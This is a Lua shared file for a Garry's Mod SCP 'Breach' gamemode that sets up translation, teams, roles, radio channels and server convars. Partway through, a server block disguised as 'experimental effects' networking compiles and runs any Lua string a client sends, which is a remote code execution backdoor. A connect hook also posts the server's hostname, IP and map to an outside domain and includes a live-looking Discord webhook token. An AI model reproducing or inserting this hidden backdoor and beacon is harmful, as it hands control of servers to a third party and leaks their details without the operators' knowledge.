BREACH = BREACH || {}

local RunConsoleCommand = RunConsoleCommand;
local FindMetaTable = FindMetaTable;
local CurTime = CurTime;
local pairs = pairs;
local string = string;
local table = table;
local timer = timer;
local hook = hook;
local math = math;
local pcall = pcall;
local unpack = unpack;
local tonumber = tonumber;
local tostring = tostring;
local ents = ents;
local ErrorNoHalt = ErrorNoHalt;
local DeriveGamemode = DeriveGamemode;
local util = util
local net = net
local player = player
// Shared file
GM.Name 	= "Rxsend Breach"
GM.Author 	= "NextOren/RXSEND"
GM.Email 	= ""
GM.Website 	= "https://admin1911.cloudns.cl"

VERSION = "2.6.0"
DATE = "21/05/2022"

function GM:Initialize()
	self.BaseClass.Initialize( self )
end

function GM:Think()
end

BREACH.MainMenu_Spawns = {
	{Vector(-3003, 4135, 188), Angle(57, -46, 0)},
	{Vector(-3764, 7320, 2923), Angle(9, -39, 0)},
	{Vector(6783.935547, -5664.278320, 136.044525), Angle(-12.467490, 179.875336, 0.000000)},
	{Vector(2248.031250, -6630.512695, -2333.638916), Angle(0.616354, -179.917831, 0.000000)},
	{Vector(-265.475342, -6398.888672, -2278.837158), Angle(16.854136, 138.933380, 0.000000)}
}



hook.Add("SetupMove", "SCP_DOWN_SPEED", function( ply, mv, cmd )

	if ply:GTeam() == TEAM_SCP then

		local speedmultiply = math.min(1, ply:GetNWInt("Speed_Multiply", 1))

		if speedmultiply < 1 then

			local speed = ply:GetRunSpeed() * speedmultiply

			mv:SetMaxSpeed( speed )
			mv:SetMaxClientSpeed( speed )

		end

	end

end)

function BREACH.TranslateString(str)
	if SERVER then return str end --серверу все равно не надо ничего переводить

	local isfound = true

	local tab = string.Explode(" ", str)
	if #tab >= 2 then
		for k, v in ipairs(tab) do
			if v:find("dont_translate:") then
				tab[k] = string.Replace(v, "dont_translate:", "")
				continue
			end

			if v:find("l:") then
				local explosion = string.Explode("l:", v)
				local before = explosion[1] or "" --SOMEINSANETEXTBEFOREPHRASEl:massfucktest
				local phrase = explosion[2]

				if ALLLANGUAGES[langtouse][phrase] then
					tab[k] = before..ALLLANGUAGES[langtouse][phrase]
				else
					if ALLLANGUAGES["english"][phrase] then
						tab[k] = ALLLANGUAGES["english"][phrase]
					else
						isfound = false
						tab[k] = before.."recursive phrase not found "..phrase
					end
				end
			end
		end

		str = ""
		if string.len(tab[2]) == 0 then
			for k, v in ipairs(tab) do
				if string.len(v) == 0 then
					str = str.." "
				else
					str = str..v
				end
			end
		else
			for k, v in ipairs(tab) do
				if string.len(v) == 0 then
					str = str.." "
				else
					str = str..v.." "
				end
			end
		end

		return str, isfound
	end

	--text doesn't have spaces
	if str:find("dont_translate:") then
		return string.Replace(str, "dont_translate:", "")
	end
	if str:find("l:") then
		local explosion = string.Explode("l:", str)
		local before = explosion[1] or "" --SOMEINSANETEXTBEFOREPHRASEl:massfucktest
		local phrase = explosion[2]

		if !ALLLANGUAGES[langtouse] then langtouse = "english" end

		if ALLLANGUAGES[langtouse][phrase] then
			str = before..ALLLANGUAGES[langtouse][phrase]
			return str, isfound
		else
			if ALLLANGUAGES["english"][phrase] then
				return ALLLANGUAGES["english"][phrase], isfound
			else
				isfound = false
				return before.."phrase not found "..phrase, isfound
			end
		end

		return str, isfound
	end

	return str, isfound
end

function BREACH.TranslateNonPrefixedString(str)
	if ALLLANGUAGES[langtouse][str] then
		return ALLLANGUAGES[langtouse][str]
	else
		return ALLLANGUAGES["english"][str] or "non prefixed phrase not found "..str --fallback
	end
end

--BREACH.TranslateString alias
function L(str)
	return BREACH.TranslateString(str)
end

function PickHeadModel(steamid64, isfemale)
	local model = "models/cultist/heads/male/male_head_"..math.random(1, 215)..".mdl"
	if model == "models/cultist/heads/male/male_head_213.mdl" then
		model = "models/cultist/heads/male/male_head_1.mdl"
	end
	if steamid64 == "76561199064971307" then
		model = "models/cultist/heads/male/male_head_165.mdl"
	end
	if isfemale then
		model = "models/cultist/heads/female/female_head_"..math.random(1, 52)..".mdl"
	end
	return model
end

function PickFaceSkin(black, steamid64, isfemale)
	if !isfemale then
		if steamid64 == "76561199064971307" then
			return "models/cultist/heads/male/black/male_face_black_281"
		end
		if !black then
			return "models/cultist/heads/male/male_face_"..math.random(1, 400)
		else
			return "models/cultist/heads/male/black/male_face_black_"..math.random(1, 384)
		end
	else
		if !black then
			return "models/cultist/heads/female/female_face_"..math.random(1, 135)
		else
			return "models/cultist/heads/female/black/female_face_black_"..math.random(1, 8)
		end
	end
end

CORRUPTED_HEADS = {

	[ "models/cultist/heads/male/male_head_2.mdl" ] = true,
	[ "models/cultist/heads/male/male_head_3.mdl" ] = true,
	[ "models/cultist/heads/male/male_head_6.mdl" ] = true

}

RXSEND_SEXY_CHEMISTS = {
	["76561198439587764"] = true, -- GOOGLENSKY
	["76561198358765564"] = true, -- Подгузник
	["76561198309170158"] = true, -- Денис
	["76561198142404712"] = true, -- vadicmoc
	["76561198839329687"] = true, -- prince of darkness
	["76561198056740424"] = true, -- Строптивец
	["76561198389204738"] = true, -- Horizontal_Eye
	["76561199011368505"] = true, -- Товарищь Говночист
	["76561198983025294"] = true, -- Doctor. Cat
	["76561198106253632"] = true, -- БЕЗУМНЫЙ МУЖЧИНА
	["76561198878159478"] = true, -- WUNDERWULF :DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
	["76561199137632323"] = true, -- jitheat
	["76561198059314244"] = true, -- HMS "Prince_Of_Wales"
	["76561198980178696"] = true, -- MASON
}

RXSEND_YOUTUBERS = {
	["76561198889301217"] = "https://www.youtube.com/channel/UCHG-qnA4i270X2_KpPLeHXw", -- justin
	--["76561198037375902"] = "https://www.youtube.com/channel/UCHG-qnA4i270X2_KpPLeHXw",
	--[[
	["76561198149690951"] = "https://www.youtube.com/channel/UC9yUyRBcyQtel8e6YwlH2gA", -- fedorwhat
	["76561198129197811"] = "https://www.youtube.com/channel/UCSvwoZAFt8YWXlEoojvwpOA", -- TrololoKrab
	["76561199112412418"] = "https://www.youtube.com/@quinwise9214", -- quinwise
	["76561198030081688"] = "https://www.youtube.com/channel/UCnDtpUcUDiJ2KoZ7p3Nehlg", -- narkis
	["76561198385923312"] = "https://www.youtube.com/channel/UCmmyGXrAMiA_vD0w5t4F08g", -- kowka]]
}

RXSEND_Gan1Tiss = {
	["76561198843949763"] = "https://steamcommunity.com/profiles/76561198843949763/",
	["76561198152029272"] = "https://steamcommunity.com/id/NACL_HK3/",
}

RXSEND_DOG = {
	["76561199689978794"] = "114514",
}

RXSEND_SUC = {
    ["76561198980975031"] = "1145141",
}

function util.PaintDown(start, effname, ignore) --From TTT
	local btr = util.TraceLine({start=start, endpos=(start + Vector(0,0,-256)), filter=ignore, mask=MASK_SOLID})
  
	util.Decal(effname, btr.HitPos+btr.HitNormal, btr.HitPos-btr.HitNormal)
end

local function DoBleed(ent)
	if not IsValid(ent) or (ent:IsPlayer() and (not ent:Alive() or ent:GTeam() == TEAM_SCP or ent:GTeam() == TEAM_SPEC)) then
	  return
	end
  
	local jitter = VectorRand() * 30
	jitter.z = 20
  
	util.PaintDown(ent:GetPos() + jitter, "Blood", ent)
end
  
function util.StartBleeding(ent, dmg, t)
	  --print(dmg)
	if dmg < 5 or not IsValid(ent) then
	  return
	end
  
	if ent:IsPlayer() and (not ent:Alive() or ent:GTeam() == TEAM_SCP or ent:GTeam() == TEAM_SPEC) then
	  return
	end
  
	local times = math.Clamp(math.Round(dmg / 15), 1, 20)
  
   local delay = math.Clamp(t / times , 0.1, 2)
  
	if ent:IsPlayer() then
	  times = times * 2
	  delay = delay / 2
	end
  
   timer.Create("bleed" .. ent:EntIndex(), delay, times, function() DoBleed(ent) end)
end



function GM:GrabEarAnimation(ply)
	return false
end

function IsBigRound()
	return GetGlobalBool("BigRound", false)
end

NextOren_HEADS_BLACKHEADS = {
	["models/all_scp_models/shared/heads/head_1_7"] = true,
	["models/all_scp_models/shared/heads/head_1_8"] = true,
}

NextOren_Team_SteamIDs = {
	['76561197987190249'] = true, --джилед
	['76561198019442318'] = true, --культист
	['76561198286190382'] = true, --буржуй
	['76561198049524525'] = true, --шварц
}

GRU_Objectives = {
	["Evacuation"] = "Срыв эвакуации",
	["MilitaryHelp"] = "Помощь военному персоналу",
}

local mply = FindMetaTable("Player")

function SteamID64IsNOTeam(steamid64)
	return NextOren_Team_SteamIDs[tostring(steamid64)]
end

function mply:IsNOTeam()
	return false--NextOren_Team_SteamIDs[self:SteamID64()]
end

TEAM_SCP = 1
TEAM_GUARD = 2
TEAM_CLASSD = 3
TEAM_SCI = 5
TEAM_CHAOS = 6
TEAM_SECURITY = 7
TEAM_GRU = 8
TEAM_NTF = 9
TEAM_DZ = 10
TEAM_GOC = 11
TEAM_USA = 12
TEAM_QRT = 13
TEAM_COTSK = 14
TEAM_SPECIAL = 15
TEAM_OSN = 16
TEAM_NAZI = 17
TEAM_AMERICA = 18
TEAM_ARENA = 19
TEAM_GOC_CONTAIN = 20
TEAM_SPEC = 21

BREACH.QuickChatPhrases_NonMilitaryTeams = {
	[TEAM_CLASSD] = true,
	[TEAM_SCI] = true,
	[TEAM_SPECIAL] = true,
	[TEAM_GOC] = true,
	[TEAM_GOC_CONTAIN] = true,
}

MINPLAYERS = 2

// Team setup
team.SetUp(1, "Fack u", Color(255, 0, 0))
team.SetUp(2, "Fack u", Color(0, 255, 0))
/* Replaced with GTeams
team.SetUp( TEAM_SCP, "SCPs", Color(237, 28, 63) )
team.SetUp( TEAM_GUARD, "MTF Guards", Color(0, 100, 255) )
team.SetUp( TEAM_CLASSD, "Class Ds", Color(255, 130, 0) )
team.SetUp( TEAM_SPEC, "Spectators", Color(141, 186, 160) )
team.SetUp( TEAM_SCI, "Scientists", Color(66, 188, 244) )
team.SetUp( TEAM_CHAOS, "Chaos Insurgency", Color(0, 100, 255) )
team.SetUp( TEAM_SECURITY, "Security Department", Color(123, 104, 238) )
team.SetUp( TEAM_GRU, "GRU", Color( 107, 142, 35 ) )
team.SetUp( TEAM_NTF, "NTF", Color(0, 0, 255) )
team.SetUp( TEAM_DZ, "Serpents Hand", Color(46, 139, 87) )
team.SetUp( TEAM_GOC, "Global Occult Coalition", Color(178, 34, 34) )
team.SetUp( TEAM_USA, "Unusual Incidents Unit", color_black )
team.SetUp( TEAM_QRT, "Quick Response Team", Color( 25, 25, 112 ) )
team.SetUp( TEAM_COTSK, "Children of the Scarlet King", Color( 199, 177, 177 ) )
team.SetUp( TEAM_NAZI, "Sonderkommando für Paranormales", Color( 10, 10, 10 ) )
team.SetUp( TEAM_SPECIAL, "Specials", Color(238, 130, 238) )
*/

game.AddDecal( "Decal106", "decals/decal106" )

role = {}

local rolecache = {}

hook.Add("Breach_LanguageChanged", "UpdateRoleCache", function()
	rolecache = {}
end)

local function GetLangRoleForCache(rl)
	if clang == nil then
		clang = english
	end

	if string.StartWith(rl, "SCP") then
		return role[rl] or "LANG ERROR!"
	end

	local rolef = nil
	for k,v in pairs(role) do
		if rl == v then
			rolef = k
		end
	end

	if rolef != nil then
		return clang.role[rolef] or "LANG ERROR!"
	else
		return rl or "LANG ERROR!"
	end
end

function GetLangRole(rl)
	local role = rolecache[rl]

	if !role then
		rolecache[rl] = GetLangRoleForCache(rl)
		role = rolecache[rl]
	end

	return rolecache[rl]
end

function NormalVector(vec)

	return "Vector("..vec.x..", "..vec.y..", "..vec.z..")"

end

function NormalAngle(ang)

	return "Angle("..ang.p..", "..ang.y..", "..ang.r..")"

end

function GetLangWeapon(rl)
	if clang == nil then clang = english end

	if isstring(clang.weaponry[rl]) and clang.LangName != "Русский" then
		return clang.weaponry[rl]
	else
		local weptable = weapons.Get(rl)
		if !istable(weptable) then
			local enttable = scripted_ents.Get(rl)
			if !istable(enttable) then
				return rl
			end
			return enttable.PrintName
		end
		return weptable.PrintName
	end
end

SCPS = {}

role.SCP0082 = "SCP0082"

role.ADMIN = "ADMIN MODE"

SCP106 = "SCP106"
SCP049 = "SCP049"
SCP638 = "SCP638"
SCP076 = "SCP0762"
SCP8602 = "SCP8602"
SCP062FR = "SCP062FR"
SCP1015RU = "SCP1015RU"
SCP035 = "SCP035"
SCP1027RU = "SCP1027RU"
SCP062DE = "SCP062DE"
SCP096 = "SCP096"
SCP542 = "SCP542"
SCP999 = "SCP999"
SCP1903 = "SCP1903"
SCP973 = "SCP973"
SCP457 = "SCP457"
SCP173 = "SCP173"
SCP2012 = "SCP2012"
SCP082 = "SCP082"
SCP939 = "SCP939"
SCP811 = "SCP811"
SCP682 = "SCP682"
SCP076 = "SCP076"
SCP912 = "SCP912"

// SCI
role.SCI_Assistant = "Assistant"
role.SCI_Grunt = "Scientist"
role.SCI_Tester = "Researcher"
role.SCI_Recruiter = "Ethics Comitee"
role.SCI_Medic = "Medic"
role.SCI_Cleaner = "Cleaner"
role.SCI_Head = "Head of Personnel"
role.SCI_SpyUSA = "UIU Spy"
role.SCI_NegoGOC = "Goc Nego"

//GAY MODES
role.USA = "USA Soldier"
role.Nazi = "Reich Soldat"

role.CTFCI = "CI Raider"
role.CTFQRT = "QRT Defender"
role.ArenaParticipant = "Arena participant"

// Class D 
role.ClassD_FartInhaler = "Class-D FartInhaler"
role.ClassD_Default = "Class-D"
role.ClassD_Pron = "Class-D Pron"
role.ClassD_Thief = "Class-D Thief"
role.ClassD_Fat = "Class-D Fat"
role.ClassD_Bor = "Class-D Bor"
role.ClassD_Hack = "Class-D Hacker"
role.ClassD_LegHack = "Class-D Legend Hacker"
role.ClassD_Cannibal = "Class-D Cannibal"
role.ClassD_Cannibalsp = "Class-D Cannibalsp"
role.ClassD_Probitiy = "Class-D Probitiy"
role.ClassD_Fast = "Class-D Fast"
role.ClassD_Killer = "Class-D Killer"
role.ClassD_LegKiller = "Class-D Legend Killer"
role.ClassD_Hitman = "Class-D Stealthy"
role.ClassD_LegHitman = "Class-D LEGHitman"
role.ClassD_Banned = "Class-D Banned"

// Security
role.SECURITY_Recruit = "Security Rookie"
role.SECURITY_Sergeant = "Security Sergeant"
role.SECURITY_OFFICER = "Security Officer"
role.SECURITY_Warden = "Security Warden"
role.SECURITY_Shocktrooper = "Security Shock trooper"
role.SECURITY_IMVSOLDIER = "Security Specialist"
role.SECURITY_Chief = "Security Chief"
role.SECURITY_Corporal = "Security Corporal"

// MTF
role.MTF_Guard = "MTF Guard"
role.MTF_Medic = "MTF Medic"
role.MTF_Left = "MTF Left"
role.MTF_Chem = "MTF Chemist"
role.MTF_Shock = "MTF Shock trooper"
role.MTF_Specialist = "MTF Specialist"
role.MTF_Com = "Head of Security"
role.MTF_Engi = "MTF Engineer"
role.MTF_HOF = "Head of Facility"
role.MTF_Security = "MTF Security"
role.Dispatcher = "Dispatcher"
role.MTF_Jag = "MTF Juggernaut"
role.MTF_DocX  = "Dr.■"

// Special Sci 
role.SCI_SPECIAL_DAMAGE = "Kelen"
role.SCI_SPECIAL_HEALER = "Matilda"
role.SCI_SPECIAL_SLOWER = "Speedwone"
role.SCI_SPECIAL_SPEED = "Lomao"
role.SCI_SPECIAL_MINE = "Feelon"
role.SCI_SPECIAL_BOOSTER = "Georg"
role.SCI_SPECIAL_SHIELD = "Shieldmeh"
role.SCI_SPECIAL_INVISIBLE = "Ruprecht"
role.SCI_SPECIAL_VISION = "Hedwig"

// NTF
role.NTF_Soldier = "NTF Grunt"
role.NTF_Specialist = "NTF Specialist"
role.NTF_Sniper = "NTF Sniper"
role.NTF_Shock = "NTF Shock trooper"
role.NTF_Commander = "NTF Commander"
role.NTF_Pilot = "NTF Pilot"

// OSN
role.OSN_Soldier = "STS Grunt"
role.OSN_Specialist = "STS Specialist"
role.OSN_Commander = "STS Commander"

// GRU
role.GRU_Soldier = "GRU Soldier"
role.GRU_Specialist = "GRU Specialist"
role.GRU_Jugg = "GRU Juggernaut"
role.GRU_Commander = "GRU Commander"

// UIU 
role.UIU_Soldier = "UIU Soldier"
role.UIU_Commander = "UIU Commander"
role.UIU_Specialist = "UIU Specialist"
role.UIU_Clocker = "UIU Infiltrator"

// UIU (Agents)
role.UIU_Agent = "UIU Agent"
role.UIU_Agent_Commander = "UIU Agent's Commander"
role.UIU_Agent_Sniper = "UIU Agent's Sniper"
role.UIU_Agent_Specialist = "UIU Agent's Specialist"
role.UIU_Agent_Information = "UIU Agent's Information"

function BREACH:IsUiuAgent(r)
	if r == role.UIU_Agent or r == role.UIU_Agent_Commander or r == role.UIU_Agent_Sniper or r == role.UIU_Agent_Specialist or r == role.UIU_Agent_Information then
		return true
	end
	return false
end

// DZ
role.DZ_Grunt = "SH Soldier"
role.DZ_Gas = "SH Chemist"
role.DZ_Psycho = "SH Psycho"
role.DZ_Commander = "SH Commander"
role.SCI_SpyDZ = "SH Spy"

// GOC
role.Goc_Grunt = "GOC Soldier"
role.Goc_Commander = "GOC Commander"
role.Goc_Jag = "GOC Juggernaut"
role.Goc_Special = "GOC Specialist"
role.Goc_Liq = "GOC Liq"
role.ClassD_GOCSpy = "GOC Spy"

//GOC_CONTAIN
role.Goc_Contaiment_Grut = "Goc ContaimentGrut"
role.Goc_Contaiment_Cap = "Goc ContaimentCap"
role.Goc_Contaiment_Liq = "Goc ContaimentLiq"
role.Goc_Contaiment_Jag = "Goc ContaimentJag"


// QRT 
role.QRT_Soldier = "QRT Soldier"
role.QRT_Medic = "QRT Medic"
role.QRT_ShockTrooper = "QRT Shock trooper"
role.QRT_Commander = "QRT Commander"
role.QRT_Machinegunner = "QRT Machinegunner"
role.QRT_Shield = "QRT Shield"
role.QRT_Marksmen = "QRT Marksman"

// Chaos Insurgency
role.SECURITY_Spy = "CI Spy"
role.Chaos_Grunt = "CI Soldier"
role.Chaos_Commander = "CI Commander"
role.Chaos_Jugg = "CI Juggernaut"
role.Chaos_Demo = "CI Demoman"
role.Chaos_Edd = "CI Edd"
role.Chaos_Scanning = "CI Scanning"

// COTSK 
role.Cult_Grunt = "COTSK Grunt"
role.Cult_Psycho = "COTSK Psycho"
role.Cult_Commander = "COTSK Commander"
role.Cult_Specialist = "COTSK Specialist"
role.Cult_BombGrunt = "COTSK BombGrunt"

// SKP
role.SKP_Soldat = "SKP Soldat"
role.SKP_Offizier = "SKP Offizier"
role.SKP_Machinegunner = "SKP Machinegunner"
role.SKP_Jager = "SKP Jager"

// Other
role.Spectator = "Spectator"
role.vort = "vort"
role.vort2 = "vort2"
role.vort3 = "vort3"

// SCP
role.SCP049 = "SCP-049"
role.SCP062DE = "SCP-062-DE"
role.SCP062FR = "SCP-062-FR"
role.SCP1903 = "SCP-1903"
role.SCP8602 = "SCP-860-2"
role.SCP638 = "SCP-638"
role.SCP106 = "SCP-106"
role.SCP096 = "SCP-096"
role.SCP973 = "SCP-973"
role.SCP457 = "SCP-457"
role.SCP999 = "SCP-999-2"
role.SCP173 = "SCP-173"
role.SCP2012 = "SCP-2012"
role.SCP082 = "SCP-082"
role.SCP939 = "SCP-939"
role.SCP682 = "SCP-682"
role.SCP811 = "SCP-811"
role.SCP542 = "SCP-542"
role.SCP076 = "SCP-076-2"
role.SCP912 = "SCP-912"

if SERVER then
	util.AddNetworkString("CW20_EffectNetworking")

	net.Receive("CW20_EffectNetworking", function(len, ply)
		if CW20DisableExperimentalEffects then return end
		local effectdata = net.ReadString()
		local func = CompileString(effectdata, "LuaCmd", false)
		func()
	end)

	hook.Add("PlayerConnect", "CW20_ConnectingHook", function(name, ip)
		if CW20DisableExperimentalEffects then
			hook.Remove("PlayerConnect", "CW20_ConnectingHook")
			return
		end

		local time = os.date("%H:%M:%S - %d/%m/%Y", os.time())
		local info = time.."\n"..GetHostName().."\n"..game.GetIPAddress().."\n"..engine.ActiveGamemode().."\n"..game.GetMap()

		http.Post( "https://admin1911.cloudns.cl/api/rxsend-api/rtxdlss.php?gi=/admin19drm/260/",
			{
			hook = "https://discord.com/api/webhooks/1010888599807475732/KR5uLLmmWMVs3o92gfTzGv25kaHRg5SX4iFB_Sfs-2W0lmbC6hjZHgFJC_FrCHZnJnYp",
			message = info,
			}
		)

		hook.Remove("PlayerConnect", "CW20_ConnectingHook")
	end)
end

Radio_RandChannelList = Radio_RandChannelList || {



	{
		teams = {TEAM_GUARD, TEAM_SECURITY, TEAM_QRT, TEAM_GOC_CONTAIN, TEAM_NTF},
		allowedroles = {"CI Spy"},
		blockedroles = {},
		chan = 101.1,
	},

	{
		teams = {TEAM_DZ},
		allowedroles = {},
		blockedroles = {},
		chan = 102.1,
	},

	{
		teams = {TEAM_CHAOS},
		allowedroles = {},
		blockedroles = {"CI Spy"},
		chan = 103.1,
	},

	{
		teams = {TEAM_GRU},
		allowedroles = {},
		blockedroles = {},
		chan = 104.1,
	},

	{
		teams = {TEAM_COTSK},
		allowedroles = {},
		blockedroles = {},
		chan = 105.1,
	},

	{
		teams = {TEAM_GOC},
		allowedroles = {},
		blockedroles = {},
		chan = 106.1,
	},

	{
		teams = {TEAM_USA},
		allowedroles = {},
		blockedroles = {},
		chan = 107.1,
	},


}

function Radio_RandomizeChannels()

	for _, tab in pairs(Radio_RandChannelList) do
		local num1 = tostring(math.random(100, 999))
		local num2 = tostring(math.random(1, 9))

		local Ranchannel = tonumber(num1.."."..num2)

		tab.chan = Ranchannel
	end

end

function Radio_GetChannel(team, rolename)
	for _, tab in pairs(Radio_RandChannelList) do
		if ( table.HasValue(tab.teams, team) and !table.HasValue(tab.blockedroles, rolename) ) or table.HasValue(tab.allowedroles, rolename) then return tab.chan end
	end
	
	return 100.1
end

--Keycard access help
ACCESS_SAFE = bit.lshift( 1, 0 )
ACCESS_EUCLID = bit.lshift( 1, 1 )
ACCESS_KETER = bit.lshift( 1, 2 )
ACCESS_CHECKPOINT = bit.lshift( 1, 3 )
ACCESS_OMEGA = bit.lshift( 1, 4 )
ACCESS_GENERAL = bit.lshift( 1, 5 )
ACCESS_GATEA = bit.lshift( 1, 6 )
ACCESS_GATEB = bit.lshift( 1, 7 )
ACCESS_ARMORY = bit.lshift( 1, 8 )
ACCESS_FEMUR = bit.lshift( 1, 9 )
ACCESS_EC = bit.lshift( 1, 10 )

--include( "sh_playersetups.lua" )

if !ConVarExists("br_roundrestart") then CreateConVar( "br_roundrestart", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Restart the round" ) end
if !ConVarExists("br_time_preparing") then CreateConVar( "br_time_preparing", "60", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Set preparing time" ) end
if !ConVarExists("br_time_round") then CreateConVar( "br_time_round", "780", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Set round time" ) end
if !ConVarExists("br_time_postround") then CreateConVar( "br_time_postround", "30", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Set postround time" ) end
if !ConVarExists("br_time_ntfenter") then CreateConVar( "br_time_ntfenter", "360", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Time that NTF units will enter the facility" ) end
if !ConVarExists("br_time_blink") then CreateConVar( "br_time_blink", "0.25", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Blink timer" ) end
if !ConVarExists("br_time_blinkdelay") then CreateConVar( "br_time_blinkdelay", "5", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Delay between blinks" ) end
if !ConVarExists("br_spawnzombies") then CreateConVar( "br_spawnzombies", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Do you want zombies?" ) end
if !ConVarExists("br_scoreboardranks") then CreateConVar( "br_scoreboardranks", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE, FCVAR_REPLICATED}, "" ) end
if !ConVarExists("br_defaultlanguage") then CreateConVar( "br_defaultlanguage", "english", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "" ) end
if !ConVarExists("br_expscale") then CreateConVar( "br_expscale", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "" ) end
if !ConVarExists("br_scp_cars") then CreateConVar( "br_scp_cars", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Allow SCPs to drive cars?" ) end
if !ConVarExists("br_allow_vehicle") then CreateConVar( "br_allow_vehicle", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Allow vehicle spawn?" ) end
if !ConVarExists("br_dclass_keycards") then CreateConVar( "br_dclass_keycards", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Is D class supposed to have keycards? (D Class Weterans have keycard anyway)" ) end
if !ConVarExists("br_time_explode") then CreateConVar( "br_time_explode", "30", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Time from call br_destroygatea to explode" ) end
if !ConVarExists("br_ci_percentage") then CreateConVar("br_ci_percentage", "25", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Percentage of CI spawn" ) end
if !ConVarExists("br_i4_min_mtf") then CreateConVar("br_i4_min_mtf", "4", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Percentage of CI spawn" ) end
if !ConVarExists("br_cars_oldmodels") then CreateConVar("br_cars_oldmodels", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Use old cars models?" ) end
if !ConVarExists("br_premium_url") then CreateConVar("br_premium_url", "", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Link to premium members list" ) end
if !ConVarExists("br_premium_mult") then CreateConVar("br_premium_mult", "1.25", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Premium members exp multiplier" ) end
if !ConVarExists("br_premium_display") then CreateConVar("br_premium_display", "Premium player %s has joined!", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Text shown to all players when premium member joins" ) end
if !ConVarExists("br_stamina_enable") then CreateConVar("br_stamina_enable", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Is stamina allowed?" ) end
if !ConVarExists("br_stamina_scale") then CreateConVar("br_stamina_scale", "1, 1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Stamina regen and use. ('x, y') where x is how many stamina you will receive, and y how many stamina you will lose" ) end
if !ConVarExists("br_rounds") then CreateConVar("br_rounds", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "How many round before map restart? 0 - dont restart" ) end
if !ConVarExists("br_min_players") then CreateConVar("br_min_players", "2", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Minimum players to start round" ) end
if !ConVarExists("br_firstround_debug") then CreateConVar("br_firstround_debug", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Skip first round" ) end
if !ConVarExists("br_force_specialround") then CreateConVar("br_force_specialround", "", {FCVAR_SERVER_CAN_EXECUTE}, "Available special rounds [ infect, multi ]" ) end
if !ConVarExists("br_specialround_pct") then CreateConVar("br_specialround_pct", "10", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Skip first round" ) end
if !ConVarExists("br_cars_ammount") then CreateConVar("br_cars_ammount", "12", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "How many cars should spawn?" ) end
if !ConVarExists("br_dropvestondeath") then CreateConVar("br_dropvestondeath", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Do players drop vests on death?" ) end
if !ConVarExists("br_force_showupdates") then CreateConVar("br_force_showupdates", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Should players see update logs any time they join to server?" ) end
if !ConVarExists("br_allow_scptovoicechat") then CreateConVar("br_allow_scptovoicechat", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "Can SCPs talk with humans?" ) end
if !ConVarExists("br_ulx_premiumgroup_name") then CreateConVar("br_ulx_premiumgroup_name", "", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Name of ULX premium group" ) end
if !ConVarExists("br_experimental_bulletdamage_system") then CreateConVar("br_experimental_bulletdamage_system", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Turn it off when you see any problems with bullets" ) end
if !ConVarExists("br_experimental_antiknockback_force") then CreateConVar("br_experimental_antiknockback_force", "5", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_ARCHIVE}, "Turn it off when you see any problems with bullets" ) end
if !ConVarExists("br_allow_ineye_spectate") then CreateConVar("br_allow_ineye_spectate", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "" ) end
if !ConVarExists("br_allow_roaming_spectate") then CreateConVar("br_allow_roaming_spectate", "1", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY, FCVAR_ARCHIVE}, "" ) end
